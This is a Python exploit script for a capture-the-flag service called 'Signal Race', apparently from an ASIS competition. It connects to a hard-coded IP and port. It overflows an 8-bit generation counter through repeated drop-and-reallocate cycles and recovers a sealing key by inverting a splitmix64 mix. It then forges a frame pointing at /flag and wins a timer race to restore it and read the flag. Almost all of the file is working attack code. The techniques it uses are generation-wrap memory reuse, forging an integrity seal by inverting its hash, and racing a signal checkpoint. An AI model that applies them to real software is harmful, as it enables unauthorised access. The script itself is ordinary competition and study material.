#!/usr/bin/env python3
"""Signal Race — bookmark 8-bit gen wrap + SIGALRM checkpoint + sealed /flag frame."""
from __future__ import annotations

import argparse
import socket
import struct
import time

MASK = 0xFFFFFFFFFFFFFFFF
C1 = 0xFF51AFD7ED558CCD
C2 = 0xC4CEB9FE1A85EC53
CONST = 0x803196D6A2A4C21C
INV1 = pow(C1, -1, 2**64)
INV2 = pow(C2, -1, 2**64)
MAGIC = 0x53523AB0
SELECTOR_FLAG = 0x5352858A
FNV_OFF = 0xCA81E7E2
FNV_PRIME = 0x1000193


def u16(b: bytes, o: int) -> int:
    return struct.unpack_from("<H", b, o)[0]


def u32(b: bytes, o: int) -> int:
    return struct.unpack_from("<I", b, o)[0]


def u64(b: bytes, o: int) -> int:
    return struct.unpack_from("<Q", b, o)[0]


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & MASK)


def splitmix64(x: int) -> int:
    x &= MASK
    x ^= x >> 33
    x = (x * C1) & MASK
    x ^= x >> 33
    x = (x * C2) & MASK
    x ^= x >> 33
    return x


def inv_splitmix64(x: int) -> int:
    x &= MASK
    x ^= x >> 33
    x = (x * INV2) & MASK
    x ^= x >> 33
    x = (x * INV1) & MASK
    x ^= x >> 33
    return x


def mix_partial(x: int) -> int:
    x &= MASK
    x ^= x >> 33
    x = (x * C1) & MASK
    x ^= x >> 33
    x = (x * C2) & MASK
    return x


def fnv(payload: bytes) -> int:
    blob = bytearray(payload[:0x9C])
    blob[0x20:0x24] = b"\x00\x00\x00\x00"
    h = FNV_OFF
    for byte in blob:
        h = ((h ^ byte) * FNV_PRIME) & 0xFFFFFFFF
    return h


def seal1(key: int, payload: bytes) -> int:
    h = mix_partial(((u16(payload, 8) << 48) ^ u64(payload, 0x24)) & MASK)
    mixed = u64(payload, 0x10)
    mixed ^= (h >> 33) ^ key
    mixed ^= (u32(payload, 0x0C) << 17) & MASK
    mixed ^= ((u32(payload, 0) << 32) | u32(payload, 4)) & MASK
    mixed ^= h
    mixed ^= CONST
    return splitmix64(mixed)


def recover_key1(payload: bytes) -> int:
    stored = u64(payload, 0x18)
    h = mix_partial(((u16(payload, 8) << 48) ^ u64(payload, 0x24)) & MASK)
    mixed = inv_splitmix64(stored)
    key = mixed
    key ^= u64(payload, 0x10)
    key ^= h >> 33
    key ^= (u32(payload, 0x0C) << 17) & MASK
    key ^= ((u32(payload, 0) << 32) | u32(payload, 4)) & MASK
    key ^= h
    key ^= CONST
    return key & MASK


def patch_flag_frame(payload: bytes) -> bytes:
    if len(payload) != 192:
        raise ValueError(f"payload len {len(payload)}")
    key1 = recover_key1(payload)
    if seal1(key1, payload) != u64(payload, 0x18):
        raise RuntimeError("key1 recovery failed")
    if fnv(payload) != u32(payload, 0x20):
        raise RuntimeError("fnv mismatch on original frame")

    out = bytearray(payload)
    out[0:4] = p32(MAGIC)
    out[4:8] = p32(SELECTOR_FLAG)
    path = b"/flag\x00\x00\x00"
    out[0x24 : 0x24 + 8] = path
    out[0x18:0x20] = p64(seal1(key1, bytes(out)))
    out[0x20:0x24] = p32(fnv(bytes(out)))
    if seal1(key1, bytes(out)) != u64(bytes(out), 0x18):
        raise RuntimeError("reseal failed")
    return bytes(out)


class SR:
    def __init__(self, host: str, port: int, timeout: float = 30.0) -> None:
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""
        self.banner = self.readline()

    def readline(self) -> bytes:
        while b"\n" not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                raise EOFError(f"eof buf={self.buf!r}")
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line + b"\n"

    def cmd(self, line: str) -> bytes:
        self.s.sendall((line + "\n").encode())
        return self.readline()

    def cmd_ok(self, line: str, prefix: bytes = b"OK ") -> bytes:
        r = self.cmd(line)
        if not r.startswith(prefix):
            raise RuntimeError(f"{line!r} -> {r!r}")
        return r

    def close(self) -> None:
        try:
            self.s.close()
        except OSError:
            pass


def parse_id(resp: bytes, key: bytes) -> int:
    # b'OK note=18 len=1\n' / b'OK frame=18 gen=56\n'
    part = resp.split(key, 1)[1]
    return int(part.split()[0])


def exploit(host: str, port: int) -> str:
    io = SR(host, port)
    try:
        if not io.banner.startswith(b"SR/1"):
            raise RuntimeError(f"bad banner {io.banner!r}")

        r = io.cmd_ok("NOTE 00")
        slot = parse_id(r, b"note=")
        io.cmd_ok(f"BOOKMARK {slot}")

        for _ in range(128):
            io.cmd_ok(f"DROP {slot}")
            r = io.cmd_ok("NEW")
            got = parse_id(r, b"frame=")
            if got != slot:
                raise RuntimeError(f"free-list drift {got} != {slot}")

        r = io.cmd_ok("READ 0 0 192")
        hx = r.split(b"read=", 1)[1].strip()
        payload = bytes.fromhex(hx.decode())
        patched = patch_flag_frame(payload)

        io.cmd_ok("TIMER 50")
        bc = f"92{slot:02x}"
        checkpoint = 0
        for _ in range(8):
            r = io.cmd_ok(f"RUN {slot} {bc}")
            # OK run checkpoint=1
            checkpoint = int(r.strip().rsplit(b"=", 1)[1])
            if checkpoint:
                break
        if not checkpoint:
            raise RuntimeError("timer never hit 0x92 window")

        io.cmd_ok(f"WRITE 0 0 {patched.hex()}")
        r = io.cmd_ok("RESTORE")
        # OK ASIS{...}  or OK restored selector=...
        text = r.decode().strip()
        if not text.startswith("OK "):
            raise RuntimeError(text)
        flag = text[3:]
        if not flag.startswith("ASIS{") or not flag.endswith("}"):
            raise RuntimeError(f"restore without flag: {text}")
        return flag
    finally:
        io.close()


def selftest() -> None:
    x = 0x123456789ABCDEF0
    assert inv_splitmix64(splitmix64(x)) == x
    fake = bytearray(192)
    fake[0:4] = p32(MAGIC)
    fake[4:8] = p32(0x53529BFF)
    fake[8:16] = p64(0x310001)
    fake[16:24] = p64(0x4100)
    key = 0xC0FFEE123456789A
    fake[0x18:0x20] = p64(seal1(key, bytes(fake)))
    fake[0x20:0x24] = p32(fnv(bytes(fake)))
    assert recover_key1(bytes(fake)) == key
    patched = patch_flag_frame(bytes(fake))
    assert u32(patched, 4) == SELECTOR_FLAG
    assert patched[0x24:0x2A] == b"/flag\x00"
    assert recover_key1(patched) == key


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="91.107.187.160")
    ap.add_argument("--port", type=int, default=18121)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        selftest()
        print("selftest ok")
        return 0
    flag = exploit(args.host, args.port)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
